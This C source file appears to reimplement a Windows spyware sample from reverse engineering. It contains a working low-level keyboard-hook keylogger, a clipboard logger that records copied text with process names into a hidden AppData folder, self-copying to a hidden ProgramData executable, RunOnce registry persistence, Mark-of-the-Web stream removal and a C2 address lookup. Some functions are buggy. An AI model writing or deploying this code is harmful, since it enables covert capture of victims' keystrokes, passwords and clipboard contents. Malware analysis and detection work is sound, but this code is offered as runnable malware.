
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <strsafe.h>
#include <tlhelp32.h>
#include <gdiplus.h>
using namespace Gdiplus;

wchar_t g_keylogFilePath[MAX_PATH];

int EscalatePrivileges(const char * PrivilegeName) {


	LUID luid;
	if (LookupPrivilegeValueA(NULL, PrivilegeName, &luid) == 0) {
		printf("[x] Couldn't Lookup, ERR -> %d\n", GetLastError());
		return 1;
	}
	printf("[+] Lookup SUCCESS!\n");

	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) == 0) {
		printf("[x] Couldn't Open Current Process token, ERR -> %d\n", GetLastError());
		return 1;
	}
	printf("[+] GOT LOCAL PROCESS TOKEN!\n");


	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("[x] AdjustTokenPrivileges failed\n");
		return 1;
	}
	if (GetLastError() != ERROR_SUCCESS) {
		printf("[x] Couldn't Enable %s\n", PrivilegeName);
		return -1;
	}
	printf("[+] SUCCESSFULLY ENABLED %s!\n",PrivilegeName);

	

	return 0;
}


int PersistRunOnce_DropSelf(void) {
	
	
	HKEY hKey;
	if (RegCreateKeyW(HKEY_CURRENT_USER,
		L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
		&hKey) != ERROR_SUCCESS) {
		printf("[x] RegCreateKeyW() Failed, ERR -> %d\n", GetLastError());
		return -1;
	}
	int leon_str_len = lstrlenW(L"C:\\ProgramData\\FireFox\\Leon.exe");
	RegSetValueExW(hKey,L"gsx",0, REG_SZ, (const BYTE*) L"C:\\ProgramData\\FireFox\\Leon.exe",leon_str_len *2);
	RegCloseKey(hKey);
	

	wchar_t selfPath[0x104] = { 0 };
	GetModuleFileNameW(NULL, selfPath,0x104);
	//wprintf(L"[+] selfPath is %s\n", selfPath);

	const wchar_t* intendedDirPath = L"C:\\ProgramData\\Firefox";
	const wchar_t* intendedFullPath = L"C:\\ProgramData\\Firefox\\Leon.exe";

	if (GetFileAttributesW(intendedDirPath) == INVALID_FILE_ATTRIBUTES){
		
		printf("[+] intendedDirPath not found, Creating Folder now..\n");
		CreateDirectoryW(intendedDirPath,NULL);
	}
	CopyFileW(selfPath, intendedFullPath, 0);

	wchar_t* intendedFullPathWithADS = (wchar_t*) malloc((size_t) 0x104 * (size_t) sizeof(wchar_t));
	memset(intendedFullPathWithADS, 0, 0x104 *sizeof(wchar_t));
	wcscpy_s(intendedFullPathWithADS, 0x104 / sizeof(wchar_t),intendedFullPath);
	wcscat_s(intendedFullPathWithADS, 0x104 / sizeof(wchar_t), L":Zone.Identifier");
	//wprintf(L"[+] intendedFullPathWithADS -> %ws \n", intendedFullPathWithADS);
	
	
	if (DeleteFileW(intendedFullPathWithADS) == 0) {

		/* 
		It won't delete any ADS as Zone.Identifier ads exists in Files Downloaded from the WEB
		This block simulates the actual sample logic
		*/
		//printf("[x] Delete failed ,err -> %d\n",GetLastError());
	}
	free(intendedFullPathWithADS);

	SetFileAttributesW(intendedDirPath, FILE_ATTRIBUTE_HIDDEN);
	SetFileAttributesW(intendedFullPath, FILE_ATTRIBUTE_HIDDEN);


	return 0;
}


int CompareSelfPathToTargetPath(void) {


	wchar_t selfPath[0x104] = { 0 };
	GetModuleFileNameW(NULL, selfPath, 0x104);
	//wprintf(L"[+] selfPath is %s\n", selfPath);
	const wchar_t* intendedFullPath = L"C:\\ProgramData\\Firefox\\Leon.exe";

	int compareResult = lstrcmpW(selfPath, intendedFullPath);

	printf("[+] compareResult = %d\n",compareResult);

	return compareResult;
}

int RetriveCmdlineArgs(void) {

	LPWSTR cmdLine = GetCommandLineW();

	int NumArgs = 0;
	if (CommandLineToArgvW(cmdLine, &NumArgs) == NULL) {
		printf("[x] CommandLineToArgvW failed, err -> %d\n", GetLastError());
		return 0;
	}
	printf("NumArgs -> %d\n", NumArgs);

	return NumArgs;
}

void ExecuteTargetPath_NoArg(const wchar_t * intendedFullPath) {
	wchar_t currentDir[0x104] = { 0 };
	GetCurrentDirectoryW(0x104, currentDir);

	PROCESS_INFORMATION processInformation = { 0 };
	STARTUPINFOW startupInfo = { 0 };
	startupInfo.cb = sizeof(STARTUPINFOW);

	BOOL result = CreateProcessW(intendedFullPath, NULL, NULL, NULL, 0, 0, NULL,
		currentDir, &startupInfo, &processInformation);

	if (result == 0) {
		printf("[x] CreateProcessW Failed, err -> %d\n", result);
		
		return;
	}

	CloseHandle(processInformation.hProcess);
	CloseHandle(processInformation.hThread);
	return;
}


HANDLE MutexOperations(const wchar_t* MutexName) {

	HANDLE hMutex = OpenMutexW(MUTEX_ALL_ACCESS, 0, MutexName);

	if (hMutex) {
		printf("[DEBUG] OpenMutexW Found Mutex, HANDLE ADDRESS-> %p\n",hMutex);
		
		return (HANDLE) 0;
	}

	hMutex = CreateMutexW(NULL, 1, MutexName);

	if (!hMutex) {

		printf("[x] CreateMutexW Failed, err -> %d\n", GetLastError());
	}
	
	return (HANDLE) 1;
}

int StartSocket(void) {

	WSADATA wSAData;
	memset(&wSAData, 0, (size_t)sizeof(WSADATA));
	if (WSAStartup(0x202, &wSAData)) {
		return (int) WSAGetLastError();
	}

	return 0;
}

Status StartGDI(void) {


	GdiplusStartupInput input = { 0 };
	input.GdiplusVersion = 1;
	input.DebugEventCallback = NULL;
	input.SuppressBackgroundThread = 0;
	input.SuppressExternalCodecs = 0;
	ULONG_PTR gdiplusToken;
	Status GdiInitStatus = GdiplusStartup(&gdiplusToken, &input, NULL);

	return GdiInitStatus;
}

void InitCriticalSections() {

	/*
	00459276        InitializeCriticalSection(&data_4b9994);
00459289        InitializeCriticalSection(&data_4b99ac);
00459290        InitializeCriticalSection(&data_4b99c4);
00459297        InitializeCriticalSection(&data_4b99dc);
004592a1        return InitializeCriticalSection(&data_4b99f4);

	
	*/

	LPCRITICAL_SECTION data_4b9994 = NULL;
	LPCRITICAL_SECTION data_4b99ac = NULL;
	LPCRITICAL_SECTION data_4b99c4 = NULL;
	LPCRITICAL_SECTION data_4b99dc = NULL;
	LPCRITICAL_SECTION data_4b99f4 = NULL;

	InitializeCriticalSection(data_4b9994);
	InitializeCriticalSection(data_4b99ac);
	InitializeCriticalSection(data_4b99c4);
	InitializeCriticalSection(data_4b99dc);
	return InitializeCriticalSection(data_4b99f4);



}

int LogKeystroke(const wchar_t* key) { 


	// Buffer to hold the character (255 chars + null terminator)
	wchar_t buffer[256];

	// Open the log file in append mode with UTF-16LE encoding
	// "a" = Append mode (creates file if it doesn't exist)
	// "ccs=UTF-16LE" = UTF-16 Little Endian encoding
	FILE* fileHandle = _wfopen(g_keylogFilePath, L"a,ccs=UTF-16LE");

	// Check if file opened successfully
	if (fileHandle == NULL) {
		return -1;  // Failed to open file
	}

	// Copy the string (character or string) to the buffer and null-terminate
	// Use secure copy to avoid buffer overflow
	wcscpy_s(buffer, 256, key);

	// Calculate string length
	int length = (int)wcslen(buffer);

	// Write the character to the file
	// Parameters: buffer, element_size(2 bytes for wchar_t), count, fileHandle
	fwrite(buffer, sizeof(wchar_t), length, fileHandle);

	// Close the file
	int result = fclose(fileHandle);

	return result;
 }


int LogWindowTimeStamp(wchar_t * currentWindowName) {

	SYSTEMTIME systemTime;
	GetLocalTime(&systemTime);
	wchar_t logBuffer[0x208];
	memset(logBuffer, 0, 0x208);
	wsprintfW(
		logBuffer,                    // Output buffer (data_4b6d38)
		L"\r\n[%02d/%02d/%d %02d:%02d:%02d] (%s)\r\n",  // Format string
		systemTime.wMonth,              // MM (2 digits)
		systemTime.wDay,                // DD (2 digits)
		systemTime.wYear,               // YYYY (4 digits)
		systemTime.wHour,               // HH (2 digits, 24-hour)
		systemTime.wMinute,             // MM (2 digits)
		systemTime.wSecond,             // SS (2 digits)
		currentWindowName                   // Current window title (data_4b6f40)
	);
	

	return LogKeystroke(logBuffer);
}

wchar_t g_previousWindowName[1024] = { 0 };
int HandleRegularKey(KBDLLHOOKSTRUCT* hook_struct, int bCapsFound) {

	HWND hWnd = GetForegroundWindow();
	wchar_t currentWindowName[1024] = { 0 };
	GetWindowTextW(hWnd, currentWindowName, 520);
	

	int windowTitleChanged = wcscmp(g_previousWindowName, currentWindowName);
	if (windowTitleChanged != 0) { // not identical
		LogWindowTimeStamp(currentWindowName);

	}
	wcscpy_s(g_previousWindowName, 520, currentWindowName);

	DWORD dwProcID = 0;
	DWORD dwThreadID = GetWindowThreadProcessId(hWnd, &dwProcID);
	BYTE *keyState = (BYTE *) malloc(256);
	if (!keyState) { printf("[x] malloc failed\n"); return -1; }
	GetKeyboardState(keyState);
	
	HKL dwhkl = GetKeyboardLayout(dwThreadID);
	wchar_t pwszBuff[16] = { 0 };
	ToUnicodeEx(hook_struct->vkCode, hook_struct->vkCode, keyState, pwszBuff,16,0, dwhkl);

	if (bCapsFound == 1) {// caps lock on
		CharUpperW(pwszBuff);
	}

	LogKeystroke(pwszBuff);

	free(keyState);
}

LRESULT CALLBACK KeyHookProc(
	int nCode,
	WPARAM wParam,
	LPARAM lParam
)
{

	KBDLLHOOKSTRUCT* hook_struct = (KBDLLHOOKSTRUCT*)lParam;
	int var_c_7;
	//https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
	
	if (nCode >= 0 && wParam == WM_KEYDOWN) {

		if (hook_struct->vkCode > 0x27) {
			// Virtual keys above 0x27 (up arrow)
			switch (hook_struct->vkCode) {
			case 0x28:  // VK_DOWN - Down arrow
				LogKeystroke(L"[DOWN]");
				break;
			case 0x2A:  // VK_PRINT - Print Screen
				LogKeystroke(L"[PRINT]");
				break;
			case 0x2D:  // VK_INSERT - Insert
				LogKeystroke(L"[INSERT]");
				break;
			case 0x2E:  // VK_DELETE - Delete
				LogKeystroke(L"[DEL]");
				break;
			case 0xBC:  // Comma key
				LogKeystroke(L",");  // Note: points to data_483d30 (comma)
				break;
			case 0xBE:  // Period key  
				LogKeystroke(L".");  // Note: points to data_483d34 (period)
				break;
			default:
			label_40755c:
				
				if (!GetKeyState(0x14)) {
					var_c_7 = 0; // caps lock off
				}
				else {
					var_c_7 = 1;  // caps lock on
					
				}
				//sub_407693 should be called in this else
				HandleRegularKey(hook_struct, var_c_7);
			}
		}

		// Virtual keys 0x27 and below
		else if (hook_struct->vkCode == 0x27) {           // VK_RIGHT
			LogKeystroke(L"[RIGHT]");
		}
		else if (hook_struct->vkCode == 0x08) {       // VK_BACK
			LogKeystroke(L"[BACK]");
		}
		else if (hook_struct->vkCode == 0x11) {    // VK_CONTROL (actually ALT in this code)
			LogKeystroke(L"[ALT]");
		}
		else if (hook_struct->vkCode != 0x14) {    // VK_CAPITAL (Caps Lock)
			if (hook_struct->vkCode == 0x23) {    // VK_END
				LogKeystroke(L"[END]");
			}
			else if (hook_struct->vkCode == 0x25) {    // VK_LEFT
				LogKeystroke(L"[LEFT]");
			}
			else {
				if (hook_struct->vkCode != 0x26) {	// VK_UP
					goto label_40755c;
				}
				LogKeystroke(L"[UP]");
			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


	
HHOOK InstallKeyboardHook() {
	HHOOK hHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyHookProc,NULL,0);

	return hHook;
}

LRESULT CALLBACK MouseHookProc(
	int nCode,
	WPARAM wParam,
	LPARAM lParam
)
{
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void InstallMouseHook() {

	HHOOK hHook = SetWindowsHookExA(WH_MOUSE_LL, MouseHookProc, NULL, 0);


	return;
}

void GetC2Info() {

	ADDRINFOW hints = { 0 };
	hints.ai_flags = AI_CANONNAME;
	hints.ai_family = AF_UNSPEC;

	PADDRINFOW outHostInfo = NULL;
	//memset(outHostInfo, 0, sizeof(ADDRINFOW));
	// should be gsx.uk.com which is the actual c2 server
	if (GetAddrInfoW(L"192.168.100.58", L"80", &hints, &outHostInfo) != 0) {
		printf("[x] GetAddrInfoW() failed, err -> %d\n", WSAGetLastError());
		FreeAddrInfoW(outHostInfo);
		return;
	}
	
	char ipString[46];
	sockaddr_in* ai_addr = (sockaddr_in *) outHostInfo->ai_addr;
	inet_ntop(AF_INET, &(ai_addr->sin_addr), ipString, sizeof(ipString));

	printf("[+] ipString: %s\n", ipString);

	return;
}



void SetupKeylogFolder() {

	wchar_t pathName[MAX_PATH];
	wchar_t appDataPath[MAX_PATH];

	DWORD size = GetEnvironmentVariableW(L"APPDATA", appDataPath, MAX_PATH);
	if (size > 0 && size < MAX_PATH) {
		swprintf(pathName, MAX_PATH, L"%s\\ConfigsEx", appDataPath);
	}

	//wchar_t pathName[] = L"C:\\Users\\Victim\\AppData\\Roaming\\ConfigsEx";
	
	if (GetFileAttributesW(pathName) != FILE_ATTRIBUTE_DIRECTORY) {
		// directory isn't created
		CreateDirectoryW(pathName,NULL);
		SetFileAttributesW(pathName, FILE_ATTRIBUTE_HIDDEN);
	}
	
	// directory is created

	wchar_t finalPath[MAX_PATH];

	//Get the actual current local system time
	SYSTEMTIME lt;
	GetLocalTime(&lt);

	//Determine AM or PM
	LPCWSTR period = (lt.wHour >= 12) ? L"PM" : L"AM";

	//Convert 24-hour clock to 12-hour clock format
	int hour12 = lt.wHour % 12;
	if (hour12 == 0) hour12 = 12;

	//Format and append the path and date string together safely
	// Format pattern matches: YYYY MM DD - HH MM AM/PM
	HRESULT hr = StringCchPrintfW(
		finalPath,
		MAX_PATH,
		L"%s\\%04d %02d %02d - %02d %02d %s",
		pathName,
		lt.wYear,
		lt.wMonth,
		lt.wDay,
		hour12,
		lt.wMinute,
		period
	);

	wprintf(L"Generated Path: %s\n", finalPath);
	if (GetFileAttributesW(finalPath) != (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_ARCHIVE) ) {
		// directory isn't created
		SetFileAttributesW(pathName, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_ARCHIVE);
	}

	wcscpy_s(g_keylogFilePath, MAX_PATH, finalPath);  // Secure copy
	return;
}

BOOL InitKeylogOps() {

	SetupKeylogFolder();
	InstallKeyboardHook();
	BOOL i;

	do{
		MSG msg;
		i = GetMessageW(&msg, nullptr, 0, 0);
		} while (i);
	
	return i;

	//return 0;
}


wchar_t* g_pClipboardCache = NULL;
wchar_t* g_ProcessNameCache = NULL;
BOOL InitClipboardOps() {
	// -------------------- WORKING HERE ---------------------- //
	wchar_t pathName[MAX_PATH];
	wchar_t appDataPath[MAX_PATH];

	DWORD size = GetEnvironmentVariableW(L"APPDATA", appDataPath, MAX_PATH);
	if (size > 0 && size < MAX_PATH) {
		swprintf(pathName, MAX_PATH, L"%s\\ConfigsEx", appDataPath);
	}
	if (GetFileAttributesW(pathName) != FILE_ATTRIBUTE_DIRECTORY) {
		// directory isn't created
		CreateDirectoryW(pathName, NULL);
		SetFileAttributesW(pathName, FILE_ATTRIBUTE_HIDDEN);
	}
	wcscat(pathName, L"\\ClipBoard.txt");
	


	while (1) {
		Sleep(300);
		HWND hWndNewOwner = GetForegroundWindow();

		OpenClipboard(hWndNewOwner);
		HANDLE hMem = GetClipboardData(CF_UNICODETEXT);
		if (!hMem) {
			CloseClipboard();
			return FALSE;
		}

		wchar_t* pClipboardText = (wchar_t*)GlobalLock(hMem);
		if (!pClipboardText) { GlobalUnlock(hMem); CloseClipboard(); return FALSE; }








		SYSTEMTIME systemTime;
		GetLocalTime(&systemTime);
		wchar_t logBuffer[0x208];
		memset(logBuffer, 0, 0x208);


		wchar_t currentWindowName[1024] = { 0 };
		GetWindowTextW(hWndNewOwner, currentWindowName, 520);
		DWORD dwProcessId = 0;
		GetWindowThreadProcessId(hWndNewOwner, &dwProcessId);

		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		if (hSnapshot == INVALID_HANDLE_VALUE) {
			return FALSE;
		}

		PROCESSENTRY32W pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32W);
		BOOL bFound = FALSE;
		wchar_t wszProcessName[MAX_PATH] = { 0 };
		if (Process32FirstW(hSnapshot, &pe32)) {
			do {
				if (pe32.th32ProcessID == dwProcessId) {
					// Find the last backslash
					wchar_t* pLastBackslash = wcsrchr(pe32.szExeFile, L'\\');
					wchar_t* pFileName;

					if (pLastBackslash != NULL) {
						pFileName = pLastBackslash + 1;
					}
					else {
						pFileName = pe32.szExeFile;
					}

					// Copy the filename to the output buffer
					wcsncpy_s(wszProcessName, MAX_PATH, pFileName, _TRUNCATE);
					bFound = TRUE;
					break;
				}
			} while (Process32NextW(hSnapshot, &pe32));
		}

		CloseHandle(hSnapshot);



		if (g_pClipboardCache != NULL) {
			if (wcscmp(g_pClipboardCache, pClipboardText) == 0) {
				// Text hasn't changed; unlock, close, and abort
				//GlobalUnlock(hMem);
				//CloseClipboard();

				//continue;
				if (g_ProcessNameCache != NULL) {
					if (wcscmp(g_ProcessNameCache, wszProcessName) == 0) {
						// process name hasn't changed; unlock, close, and abort
						GlobalUnlock(hMem);
						CloseClipboard();
						continue;
					}
				}
			}
		}

		//Clipboard text has changed -> update cache
		size_t textLen = wcslen(pClipboardText);
		size_t bufferSize = (textLen + 1) * sizeof(wchar_t);

		if (g_pClipboardCache) {
			free(g_pClipboardCache);
		}
		g_pClipboardCache = (wchar_t*)malloc(bufferSize);
		if (g_pClipboardCache) {
			// sub_463680 is a standard wcsncpy/memcpy wrapper
			memcpy(g_pClipboardCache, pClipboardText, bufferSize);
		}

		// Clean up clipboard handles
		GlobalUnlock(hMem);
		CloseClipboard();

		// window text has changed -> update cache
		if (g_ProcessNameCache) {
			free(g_ProcessNameCache);
		}
		g_ProcessNameCache = (wchar_t*)malloc(MAX_PATH);
		if (g_ProcessNameCache) {
			// sub_463680 is a standard wcsncpy/memcpy wrapper
			memcpy(g_ProcessNameCache, wszProcessName, MAX_PATH);
		}


		/*
		format should be
		[08/02/2026 15:35:34] [explorer.exe] (Program Files - File Explorer): wfafwfaw

		*/

		wsprintfW(
			logBuffer,                    // Output buffer (data_4b6d38)
			L"\r\n[%02d/%02d/%d %02d:%02d:%02d] [%s] (%s):\n%s\r\n",  // Format string
			systemTime.wMonth,              // MM (2 digits)
			systemTime.wDay,                // DD (2 digits)
			systemTime.wYear,               // YYYY (4 digits)
			systemTime.wHour,               // HH (2 digits, 24-hour)
			systemTime.wMinute,             // MM (2 digits)
			systemTime.wSecond,             // SS (2 digits)
			wszProcessName,					// Process Name
			currentWindowName,                   // Current window title (data_4b6f40)
			pClipboardText
		);



		// Open the log file in append mode with UTF-16LE encoding
		// "a" = Append mode (creates file if it doesn't exist)
		// "ccs=UTF-16LE" = UTF-16 Little Endian encoding
		FILE* fileHandle = _wfopen(pathName, L"a,ccs=UTF-16LE");

		// Check if file opened successfully
		if (fileHandle == NULL) {
			return -1;  // Failed to open file
		}
		size_t logLength = wcslen(logBuffer);
		// Write the character to the file
		// Parameters: buffer, element_size(2 bytes for wchar_t), count, fileHandle
		fwrite(logBuffer, sizeof(wchar_t), logLength, fileHandle);

		// Close the file
		int result = fclose(fileHandle);
	}
	return TRUE;
}

struct ThreadArgs {
	wchar_t * arg1;
	int arg2;
	int PID;

};

int sub_45cadf(struct ThreadArgs* threadArgs) {
	PROCESS_INFORMATION procInfo;
	procInfo.hProcess = 0;
	STARTUPINFOW startUpInfo = { 0 };
	memset(&startUpInfo, 0, sizeof(STARTUPINFOW));
	startUpInfo.cb = sizeof(STARTUPINFOW);
	CreateProcessW((LPCWSTR)threadArgs->arg1, NULL, NULL, NULL, 0, 0, NULL, NULL, &startUpInfo, &procInfo);
	return 0;
}

int sub_45cb44(struct ThreadArgs* threadArgs) { //sub_45cb44
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, threadArgs->PID);
	WaitForSingleObject(hProc, -1);
	CloseHandle(hProc);
	sub_45cadf(threadArgs);
	TerminateProcess(GetCurrentProcess(), 0);
	return 0;
}


//int sub_45c9ca(struct ThreadArgs* threadArgs) { //sub_45c9ca

	//return 0;
//}
int CreateProcessWrapperWithPIDasArg(struct ThreadArgs* threadArgs) { //sub_45cb8a
	
	/*
	- This function will execute the dropped leon.exe with the self pid. 
	- The new fork/child will possibly execute dead code
	*/


	wchar_t selfPath[0x104] = { 0 };
	GetModuleFileNameW(NULL, selfPath, 0x104);
	DWORD selfPID = GetCurrentProcessId();

	wchar_t cmdLineBuffer[510];

	// 0045c9f9: _memset(&var_206, 0, 0x1fc);
	// Zero out the buffer (0x1FC bytes is 254 WCHARs)
	SecureZeroMemory(cmdLineBuffer, 510);



	// 0045ca22: wsprintfW(&var_208, u""%s" %i", esi, GetCurrentProcessId());
	// Formats the string into: "C:\Path\To\Exe.exe" <PID>
	wsprintfW(cmdLineBuffer, L"\"%s\" %i", selfPath, selfPID);

	// 0045ca6d: Setup structures and call CreateProcessW
	STARTUPINFOW startupInfo = { 0 };
	PROCESS_INFORMATION processInformation = { 0 };

	SecureZeroMemory(&startupInfo, sizeof(startupInfo));
	startupInfo.cb = sizeof(startupInfo);
	SecureZeroMemory(&processInformation, sizeof(processInformation));

	// 0045ca6d: CreateProcessW(nullptr, &var_208, ...)
	CreateProcessW(
		NULL,               // lpApplicationName
		cmdLineBuffer,      // lpCommandLine (&var_208)
		NULL,               // lpProcessAttributes
		NULL,               // lpThreadAttributes
		FALSE,              // bInheritHandles
		0,                  // dwCreationFlags
		NULL,               // lpEnvironment
		NULL,               // lpCurrentDirectory
		&startupInfo,       // lpStartupInfo
		&processInformation // lpProcessInformation
	);

	
	return 0;
}

int data_4b9a84 = 0;
int data_4b051c = 1;
int sub_45caab(void) {
	while (data_4b9a84) {

		if (data_4b051c) {
			PersistRunOnce_DropSelf();
		}
		Sleep(8000);
	}
	return 0;
}




HANDLE hThread_DropSelfPersist_Sleep = NULL;
int ThreadOperations(int arg1, wchar_t * arg2, int PID) {
	struct ThreadArgs* threadArgs = (struct ThreadArgs*)malloc((size_t)sizeof(struct ThreadArgs));
	data_4b9a84 = 1;

	LPTHREAD_START_ROUTINE lpStartAddress;

	if (arg1) {
		threadArgs->arg1 = arg2;   //arg2 = 2
		threadArgs->arg2 = 0;
		threadArgs->PID = PID;
		lpStartAddress = (LPTHREAD_START_ROUTINE)sub_45cb44;
	}
	else {
		CreateProcessWrapperWithPIDasArg(threadArgs);
		lpStartAddress = (LPTHREAD_START_ROUTINE)CreateProcessWrapperWithPIDasArg;

	}

	CreateThread(NULL, 0, lpStartAddress, threadArgs, 0, NULL);
	hThread_DropSelfPersist_Sleep = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sub_45caab, 0, 0, NULL);


	free(threadArgs);

	return 0;

}


int NumArgOperation(int NumArgs) {

	int PID = 0x7b;//123
	ThreadOperations(1,(wchar_t *) NumArgs,PID);
	WaitForSingleObject(CreateEventW(NULL, 0, 0, NULL), -1); //INFINTE WAIT

	return 0;
}


